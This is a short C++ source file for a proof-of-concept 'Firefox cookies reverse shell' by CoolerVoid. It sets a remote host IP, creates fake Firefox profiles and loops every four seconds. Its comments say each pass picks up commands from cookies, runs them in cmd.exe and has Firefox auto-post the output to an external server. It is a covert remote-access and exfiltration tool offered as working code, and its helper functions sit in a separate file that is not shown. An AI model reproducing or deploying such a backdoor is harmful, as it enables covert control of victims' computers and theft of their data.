/*
Firefox's cookies reverse shell - PoC version - THis is Server
Coded by CoolerVoid - 17/12/2017

To compile:
	c++ -o test test.cpp utils.cpp sqlite.o
	
	
*/
#include <iostream>
#include <string>
#include <Windows.h>
#include "utils.h"
using namespace std;

int main()
{
	cout  << "\nFirefox remote tunnel\nby CoolerVoid\n" <<endl;
//global domain is var in utils.h, is the host of remote access
	domain="192.168.100.143";

/* infinite loop, each 4 seconds... 
1- the program execute remote shell and get cookie of  CMD 
2- Run CMD in cmd.exe write results	in file and html(with autopost js)
3- Executes firefox to open html and autopost CMD results to external server

more info ?
read utils.cpp
*/
// create fake profile
	create_fake_profile("presto");
	create_fake_profile("presto2");

	while(1)
	{
		write_cmd_cookie();
		start_cookie_tunnel();
		Sleep(4000);
	}		
   
	
	return 0;
}